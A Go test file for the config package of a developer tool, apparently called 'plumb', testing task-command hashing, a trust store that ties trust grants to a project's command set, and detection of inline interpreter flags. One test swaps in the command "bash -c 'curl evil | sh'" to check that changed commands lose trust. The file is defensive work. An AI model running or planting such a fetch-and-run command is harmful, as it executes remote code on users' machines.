package config

import (
	"os"
	"path/filepath"
	"testing"
)

// TestCanonicalTaskHash_OrderIndependent verifies the canonicalisation is stable
// under reordering: the same command set in any order hashes identically.
func TestCanonicalTaskHash_OrderIndependent(t *testing.T) {
	a := []TaskCommandSpec{
		{Lang: "go", Slot: "build", Command: "go build ./..."},
		{Lang: "go", Slot: "test", Command: "go test ./..."},
		{Lang: "python", Slot: "lint", Command: "ruff check ."},
	}
	b := []TaskCommandSpec{
		{Lang: "python", Slot: "lint", Command: "ruff check ."},
		{Lang: "go", Slot: "test", Command: "go test ./..."},
		{Lang: "go", Slot: "build", Command: "go build ./..."},
	}
	if canonicalTaskHash(a) != canonicalTaskHash(b) {
		t.Error("hash must be independent of command ordering")
	}
}

// TestCanonicalTaskHash_ChangeInvalidates verifies any add, removal, or
// modification of a command yields a different hash.
func TestCanonicalTaskHash_ChangeInvalidates(t *testing.T) {
	base := []TaskCommandSpec{
		{Lang: "go", Slot: "build", Command: "go build ./..."},
		{Lang: "go", Slot: "test", Command: "go test ./..."},
	}
	h := canonicalTaskHash(base)

	modified := []TaskCommandSpec{
		{Lang: "go", Slot: "build", Command: "go build -race ./..."}, // changed
		{Lang: "go", Slot: "test", Command: "go test ./..."},
	}
	if canonicalTaskHash(modified) == h {
		t.Error("modifying a command must change the hash")
	}

	added := append([]TaskCommandSpec{}, base...)
	added = append(added, TaskCommandSpec{Lang: "go", Slot: "lint", Command: "golangci-lint run"})
	if canonicalTaskHash(added) == h {
		t.Error("adding a command must change the hash")
	}

	removed := []TaskCommandSpec{{Lang: "go", Slot: "build", Command: "go build ./..."}}
	if canonicalTaskHash(removed) == h {
		t.Error("removing a command must change the hash")
	}

	// The empty set is stable and distinct from a populated one.
	if canonicalTaskHash(nil) != canonicalTaskHash([]TaskCommandSpec{}) {
		t.Error("empty set hash must be stable")
	}
	if canonicalTaskHash(nil) == h {
		t.Error("empty set must not collide with a populated set")
	}
}

// TestCanonicalTaskHash_InjectiveAgainstBoundaryShift is the adversarial case
// the naive "lang\x1fslot\x1fcommand" join could not rule out: an embedded
// separator byte in one field re-partitions the fields of a different command
// set into the identical byte string. Concretely, moving the \x1f from between
// Lang and Slot into the middle of Lang (while shortening Slot to compensate)
// produces the same naive join for two different command sets. The
// length-prefixed encoding must tell them apart.
func TestCanonicalTaskHash_InjectiveAgainstBoundaryShift(t *testing.T) {
	a := []TaskCommandSpec{{Lang: "go\x1fbuild", Slot: "cmd", Command: "x"}}
	b := []TaskCommandSpec{{Lang: "go", Slot: "build\x1fcmd", Command: "x"}}

	// Sanity check: the two sets really do collide under the old naive join
	// (Lang + "\x1f" + Slot + "\x1f" + Command), proving this is a genuine
	// adversarial pair and not a vacuous test.
	naive := func(cmds []TaskCommandSpec) string {
		c := cmds[0]
		return c.Lang + "\x1f" + c.Slot + "\x1f" + c.Command
	}
	if naive(a) != naive(b) {
		t.Fatalf("test setup invalid: naive joins differ (%q vs %q); not an adversarial pair", naive(a), naive(b))
	}

	if canonicalTaskHash(a) == canonicalTaskHash(b) {
		t.Errorf("canonicalTaskHash collided on a boundary-shifted adversarial pair: %q vs %q both hashed to %s",
			a, b, canonicalTaskHash(a))
	}
}

// TestTrustStore_TasksBoundToCommandSet verifies the task gate honours a grant
// only while the command set is unchanged, and invalidates on any change.
func TestTrustStore_TasksBoundToCommandSet(t *testing.T) {
	path := filepath.Join(t.TempDir(), "trust.json")
	s := newTrustStoreAt(path)
	root := t.TempDir()
	cmds := []TaskCommandSpec{{Lang: "go", Slot: "build", Command: "go build ./..."}}

	if s.IsTrustedForTasks(root, cmds) {
		t.Error("a never-trusted root must be untrusted for tasks")
	}
	if err := s.SetTrustedForTasks(root, cmds); err != nil {
		t.Fatalf("SetTrustedForTasks: %v", err)
	}
	// Persists across store instances and matches the same command set.
	if !newTrustStoreAt(path).IsTrustedForTasks(root, cmds) {
		t.Error("trust bound to the command set did not persist / match")
	}
	// A changed command set invalidates the grant (the TOCTOU close).
	changed := []TaskCommandSpec{{Lang: "go", Slot: "build", Command: "bash -c 'curl evil | sh'"}}
	if s.IsTrustedForTasks(root, changed) {
		t.Error("a changed command set must not be trusted (TOCTOU)")
	}
	// The coarse grant is also set by SetTrustedForTasks (shared non-task surfaces).
	if !s.IsTrusted(root) {
		t.Error("SetTrustedForTasks must also grant the coarse trust flag")
	}
}

// TestTrustStore_CoarseGrantNotTaskTrust verifies a coarse SetTrusted (e.g. the
// TUI Commands tab) does not by itself satisfy the task gate — the task binding
// requires a recorded hash — and that a coarse re-grant preserves an existing
// task binding.
func TestTrustStore_CoarseGrantNotTaskTrust(t *testing.T) {
	path := filepath.Join(t.TempDir(), "trust.json")
	s := newTrustStoreAt(path)
	root := t.TempDir()
	cmds := []TaskCommandSpec{{Lang: "go", Slot: "test", Command: "go test ./..."}}

	if err := s.SetTrusted(root, true); err != nil {
		t.Fatalf("SetTrusted: %v", err)
	}
	if !s.IsTrusted(root) {
		t.Error("coarse grant should make IsTrusted true")
	}
	if s.IsTrustedForTasks(root, cmds) {
		t.Error("a coarse grant with no task hash must not satisfy the task gate")
	}

	// Bind the task hash, then a coarse re-grant must not clear it.
	if err := s.SetTrustedForTasks(root, cmds); err != nil {
		t.Fatal(err)
	}
	if err := s.SetTrusted(root, true); err != nil {
		t.Fatal(err)
	}
	if !s.IsTrustedForTasks(root, cmds) {
		t.Error("a coarse re-grant must preserve the task binding")
	}
}

// TestTrustStore_LegacyBooleanUntrusted verifies an old-format `map[string]bool`
// trust.json is treated as UNTRUSTED (both coarse and task) — a schema migration
// re-confirms exactly once via `plumb trust`.
func TestTrustStore_LegacyBooleanUntrusted(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "trust.json")
	root := t.TempDir()
	legacy := `{` + `"` + canonRoot(root) + `": true}`
	if err := os.WriteFile(path, []byte(legacy), 0o600); err != nil {
		t.Fatal(err)
	}
	s := newTrustStoreAt(path)
	if s.IsTrusted(root) {
		t.Error("a legacy boolean entry must be treated as untrusted (coarse)")
	}
	if s.IsTrustedForTasks(root, []TaskCommandSpec{{Lang: "go", Slot: "build", Command: "go build ./..."}}) {
		t.Error("a legacy boolean entry must be treated as untrusted (tasks)")
	}
	// Re-confirming records the new bound record and grants trust.
	cmds := []TaskCommandSpec{{Lang: "go", Slot: "build", Command: "go build ./..."}}
	if err := s.SetTrustedForTasks(root, cmds); err != nil {
		t.Fatal(err)
	}
	if !s.IsTrustedForTasks(root, cmds) {
		t.Error("re-trust after legacy migration must take effect")
	}
}

// TestProjectTaskCommands verifies enumeration returns exactly the project-
// supplied (lang, slot, command) entries — global/default commands, which need
// no trust, are never included (an empty project yields none).
func TestProjectTaskCommands(t *testing.T) {
	// No project config → no project commands (global/default need no trust).
	empty := t.TempDir()
	if got, err := ProjectTaskCommands(empty); err != nil || len(got) != 0 {
		t.Errorf("empty project: got %v, err %v; want none", got, err)
	}

	ws := t.TempDir()
	if err := SetProjectValue(ws, []string{"tasks", "go", "build"}, "go build ./..."); err != nil {
		t.Fatal(err)
	}
	if err := SetProjectValue(ws, []string{"tasks", "go", "test"}, "go test ./..."); err != nil {
		t.Fatal(err)
	}
	got, err := ProjectTaskCommands(ws)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 {
		t.Fatalf("want 2 project task commands, got %d: %v", len(got), got)
	}
	// The hash is stable regardless of enumeration order.
	if canonicalTaskHash(got) == "" {
		t.Error("expected a non-empty hash for project commands")
	}
}

// TestFlagsInlineInterpreter is the interpreter-flag matrix: an interpreter with
// an inline-code flag matches; the same interpreter running a file does not, nor
// does a non-interpreter argv[0].
func TestFlagsInlineInterpreter(t *testing.T) {
	cases := []struct {
		argv []string
		want bool
	}{
		{[]string{"bash", "-c", "echo hi"}, true},
		{[]string{"bash", "script.sh"}, false},
		{[]string{"sh", "-c", "echo hi"}, true},
		{[]string{"python", "-c", "print(1)"}, true},
		{[]string{"python", "script.py"}, false},
		{[]string{"python3", "-c", "print(1)"}, true},
		{[]string{"node", "-e", "console.log(1)"}, true},
		{[]string{"node", "--eval", "console.log(1)"}, true},
		{[]string{"node", "app.js"}, false},
		{[]string{"perl", "-e", "print 1"}, true},
		{[]string{"ruby", "-e", "puts 1"}, true},
		{[]string{"/usr/bin/bash", "-c", "echo hi"}, true}, // basename resolved
		{[]string{"go", "build", "./..."}, false},
		{[]string{"golangci-lint", "run"}, false},
		{[]string{"bash"}, false}, // interpreter alone, no inline flag
		{nil, false},
	}
	for _, c := range cases {
		if got := FlagsInlineInterpreter(c.argv); got != c.want {
			t.Errorf("FlagsInlineInterpreter(%v) = %v, want %v", c.argv, got, c.want)
		}
	}
}
